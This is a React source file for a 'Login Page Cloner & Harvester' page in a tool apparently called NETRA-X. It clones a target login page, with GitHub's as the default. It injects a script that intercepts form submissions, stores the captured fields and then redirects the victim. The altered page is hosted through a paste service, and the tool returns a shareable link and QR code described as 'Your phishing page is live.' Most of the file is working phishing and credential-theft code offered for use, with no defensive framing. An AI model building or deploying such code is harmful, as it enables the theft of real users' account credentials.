
'use client';

import { useState, useEffect } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { useToast } from '@/hooks/use-toast';
import { CredentialHarvester, type CapturedCredential } from '@/components/credential-harvester';
import { QrCodeGenerator } from '@/components/qr-code-generator';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, Globe, Wand, StopCircle, Clipboard } from 'lucide-react';
import { Textarea } from '@/components/ui/textarea';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
import { hostOnPasteRs } from '@/actions/paste-action';

const clonerSchema = z.object({
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
  urlToClone: z.string().optional(),
  htmlContent: z.string().optional(),
}).refine(data => data.urlToClone || data.htmlContent, {
    message: 'Either a URL or HTML content is required.',
    path: ['urlToClone'],
});

const getHarvesterScript = (redirectUrl: string) => `
<script>
    function captureAndRedirect(form) {
        try {
            const formData = new FormData(form);
            const credentials = {};
            let capturedData = false;
            
            for (let [key, value] of formData.entries()) {
                if (typeof value === 'string' && value.length > 0) {
                    credentials[key] = value;
                    capturedData = true;
                }
            }
            
            if (capturedData) {
                const entry = {
                    ...credentials,
                    source: window.location.href,
                    timestamp: new Date().toISOString()
                };
                const storageKey = 'netra-captured-credentials';
                try {
                    const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
                    const updatedData = [...existingData, entry];
                    localStorage.setItem(storageKey, JSON.stringify(updatedData));
                    
                    window.dispatchEvent(new StorageEvent('storage', {
                        key: storageKey,
                        newValue: JSON.stringify(updatedData)
                    }));

                } catch(e) {
                    console.error('NETRA-X Harvester: Could not save to localStorage.', e);
                }
            }
        } catch (e) {
            console.error('NETRA-X Harvester: Error capturing form data.', e);
        } finally {
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 150);
        }
    }

    document.addEventListener('submit', function(e) {
        if (e.target && e.target.tagName === 'FORM') {
            e.preventDefault();
            e.stopPropagation();
            captureAndRedirect(e.target);
        }
    }, true);
</script>
`;

export default function PhishingPage() {
  const { toast } = useToast();
  const [capturedCredentials, setCapturedCredentials] = useState<CapturedCredential[]>([]);
  const storageKey = 'netra-captured-credentials';
  
  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [hostedUrl, setHostedUrl] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isHosting, setIsHosting] = useState(false);

  useEffect(() => {
    loadCredentialsFromStorage();
  }, []);

  const loadCredentialsFromStorage = () => {
    if (typeof window === 'undefined') return;
    try {
        const storedCreds = localStorage.getItem(storageKey);
        setCapturedCredentials(storedCreds ? JSON.parse(storedCreds) : []);
    } catch (error) {
        console.error('Failed to load credentials from localStorage', error);
        setCapturedCredentials([]);
    }
  };

  useEffect(() => {
    const handleStorageChange = (event: StorageEvent) => {
      if (event.key === storageKey) {
        const newCredsRaw = event.newValue;
        const currentCreds = capturedCredentials;

        if (newCredsRaw) {
          try {
            const newCredsList: CapturedCredential[] = JSON.parse(newCredsRaw);
            setCapturedCredentials(newCredsList); 

            if (newCredsList.length > currentCreds.length) {
                const newCredential = newCredsList[newCredsList.length - 1];
                const summary = Object.entries(newCredential)
                    .filter(([key]) => key !== 'timestamp' && key !== 'source')
                    .map(([key, value]) => `${key}: ${String(value).substring(0,20)}...`)
                    .join(', ');

                toast({
                  variant: "destructive",
                  title: "Credentials Captured!",
                  description: summary || "A form was submitted on a cloned page.",
                });
            }
          } catch (e) {
            console.error('Failed to parse updated credentials', e);
          }
        } else {
          setCapturedCredentials([]);
        }
      }
    };

    window.addEventListener('storage', handleStorageChange);
    return () => {
      window.removeEventListener('storage', handleStorageChange);
    };
  }, [toast, capturedCredentials]);

  const handleClearCredentials = () => {
    setCapturedCredentials([]);
    localStorage.removeItem(storageKey);
  };
  
  const form = useForm<z.infer<typeof clonerSchema>>({
    resolver: zodResolver(clonerSchema),
    defaultValues: {
      redirectUrl: 'https://github.com/password_reset',
      urlToClone: 'https://github.com/login',
      htmlContent: '',
    },
  });

  const resetState = () => {
    setModifiedHtml(null);
    setHostedUrl(null);
    setIsProcessing(false);
    setIsHosting(false);
    form.reset({
      redirectUrl: 'https://github.com/password_reset',
      urlToClone: 'https://github.com/login',
      htmlContent: '',
    });
  };

  const processAndInject = async (values: z.infer<typeof clonerSchema>) => {
    setIsProcessing(true);
    setModifiedHtml(null);
    setHostedUrl(null);

    try {
      let originalHtml = values.htmlContent;
      let baseHrefUrl = values.urlToClone;

      if (values.urlToClone) {
        toast({ title: "Cloning Page...", description: "Fetching HTML content from the URL." });
        const response = await clonePageFromUrl({ url: values.urlToClone });
        originalHtml = response.htmlContent;
        form.setValue('htmlContent', originalHtml);
      } else if (originalHtml) {
        const actionMatch = originalHtml.match(/action="([^"]+)"/);
        baseHrefUrl = (actionMatch && actionMatch[1].startsWith('http'))
          ? new URL(actionMatch[1]).origin
          : new URL(values.redirectUrl).origin;
      }

      if (!originalHtml) throw new Error("No HTML content to process.");

      let html = originalHtml;
      const harvesterScript = getHarvesterScript(values.redirectUrl);
      
      if (baseHrefUrl) {
        html = html.includes('<head>')
          ? html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`)
          : `<head><base href="${baseHrefUrl}"></head>${html}`;
      }

      html = html.includes('</body>')
        ? html.replace(/<\\/body>/i, `${harvesterScript}</body>`)
        : html + harvesterScript;

      setModifiedHtml(html);
      toast({ title: "HTML Prepared", description: "Credential harvester has been injected." });

    } catch (e) {
      const error = e instanceof Error ? e.message : "An unknown error occurred";
      toast({ variant: 'destructive', title: "Processing Failed", description: error });
    } finally {
      setIsProcessing(false);
    }
  };

  const hostPage = async () => {
    if (!modifiedHtml) return;
    setIsHosting(true);
    toast({ title: "Hosting Page...", description: "Uploading content to secure host." });

    try {
      const result = await hostOnPasteRs(modifiedHtml);
      if (!result.success || !result.pasteId) {
        throw new Error(result.error || "Failed to get a paste ID from the hosting service.");
      }
      
      const url = window.location.origin + "/api/phishing/serve/" + result.pasteId;
      setHostedUrl(url);
      
      toast({ title: "Page Hosted Successfully!", description: "Link is ready to be shared." });

    } catch (e) {
      const error = e instanceof Error ? e.message : "An unknown error occurred";
      toast({ variant: 'destructive', title: "Hosting Failed", description: error });
    } finally {
      setIsHosting(false);
    }
  };

  const handleCopyHtml = () => {
    if (modifiedHtml) {
      navigator.clipboard.writeText(modifiedHtml);
      toast({ title: 'Copied!', description: 'Injected HTML copied to clipboard.' });
    }
  };
  
   const handleCopyUrl = () => {
    if (hostedUrl) {
      navigator.clipboard.writeText(hostedUrl);
      toast({ title: 'Copied!', description: 'Hosted URL copied to clipboard.' });
    }
  };

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Login Page Cloner & Harvester</h1>
        <p className="text-muted-foreground">Clone login pages, host them, and capture submitted credentials.</p>
      </div>
      
      <div className="grid lg:grid-cols-2 gap-6 items-start">
        <div className="flex flex-col gap-6">
          <Card>
            <CardHeader>
              <CardTitle>1. Page Cloner</CardTitle>
              <CardDescription>Clone a page from a URL or paste HTML to inject the harvester.</CardDescription>
            </CardHeader>
            <Form {...form}>
              <form onSubmit={form.handleSubmit(processAndInject)}>
                <CardContent className="space-y-4">
                  <Tabs defaultValue="url" className="w-full">
                    <TabsList className="grid w-full grid-cols-2">
                      <TabsTrigger value="url">Clone from URL</TabsTrigger>
                      <TabsTrigger value="html">Paste HTML</TabsTrigger>
                    </TabsList>
                    <TabsContent value="url" className="mt-4">
                      <FormField control={form.control} name="urlToClone" render={({ field }) => (
                        <FormItem>
                          <FormLabel>Target Page URL</FormLabel>
                          <FormControl><Input placeholder="https://example.com/login" {...field} value={field.value ?? ''} /></FormControl>
                          <FormMessage />
                        </FormItem>
                      )} />
                    </TabsContent>
                    <TabsContent value="html" className="mt-4">
                      <FormField control={form.control} name="htmlContent" render={({ field }) => (
                        <FormItem>
                          <FormLabel>HTML Source Code</FormLabel>
                          <FormControl><Textarea placeholder="Paste page source here..." {...field} value={field.value ?? ''} className="h-40 font-mono" /></FormControl>
                          <FormMessage />
                        </FormItem>
                      )} />
                    </TabsContent>
                  </Tabs>
                  <FormField control={form.control} name="redirectUrl" render={({ field }) => (
                    <FormItem>
                      <FormLabel>Redirect URL (after capture)</FormLabel>
                      <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl>
                      <FormMessage />
                    </FormItem>
                  )} />
                  <Button type="submit" className="w-full" disabled={isProcessing}>
                    {isProcessing ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
                    Process & Inject Harvester
                  </Button>
                </CardContent>
                {modifiedHtml && (
                  <CardFooter className="flex-col gap-4">
                     <CardTitle className="text-xl">2. Host Page</CardTitle>
                    <div className="w-full flex gap-2">
                      <Button onClick={hostPage} disabled={isProcessing || isHosting} className="w-full">
                        {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
                        Host Page
                      </Button>
                      <Button variant="secondary" onClick={handleCopyHtml}>
                        <Clipboard className="mr-2 h-4 w-4" />
                        Copy HTML
                      </Button>
                    </div>
                    <Button onClick={resetState} variant="destructive" className="w-full">
                      <StopCircle className="mr-2 h-4 w-4" /> Reset
                    </Button>
                  </CardFooter>
                )}
              </form>
            </Form>
          </Card>
           {hostedUrl && (
             <Card>
               <CardHeader>
                 <CardTitle>3. Hosted Page URL</CardTitle>
                 <CardDescription>Your phishing page is live. Use the URL or QR code below.</CardDescription>
               </CardHeader>
               <CardContent className="space-y-4">
                 <div className="flex w-full items-center gap-2">
                   <Input readOnly value={hostedUrl} className="font-mono" />
                   <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
                     <Clipboard className="h-4 w-4" />
                   </Button>
                 </div>
                 <div className="flex justify-center">
                   <QrCodeGenerator url={hostedUrl} />
                 </div>
               </CardContent>
             </Card>
           )}
        </div>
        <div className="flex flex-col gap-6">
          <CredentialHarvester 
            credentials={capturedCredentials} 
            onClear={handleClearCredentials} 
            onRefresh={loadCredentialsFromStorage} 
          />
        </div>
      </div>
    </div>
  );
}
